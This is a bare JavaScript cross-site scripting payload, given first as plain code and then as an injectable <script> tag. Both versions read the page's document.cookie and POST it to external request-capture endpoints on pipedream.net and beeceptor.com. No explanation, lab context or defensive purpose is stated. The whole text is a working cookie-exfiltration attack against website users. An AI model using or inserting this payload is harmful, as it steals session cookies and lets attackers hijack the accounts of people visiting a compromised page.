const headers = new Headers();
headers.append("Content-Type", "application/json");

const body = {
  "cookies": document.cookie
};

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
};

fetch("https://eo8ev9o2rwvwzv5.m.pipedream.net", options);

<script>const headers = new Headers();headers.append("Content-Type", "application/json");const body = {"cookies": document.cookie};const options = {method: "POST",headers,mode: "cors",body: JSON.stringify(body)};fetch("https://testminifixio.free.beeceptor.com/", options); console.log(document.cookie)</script>

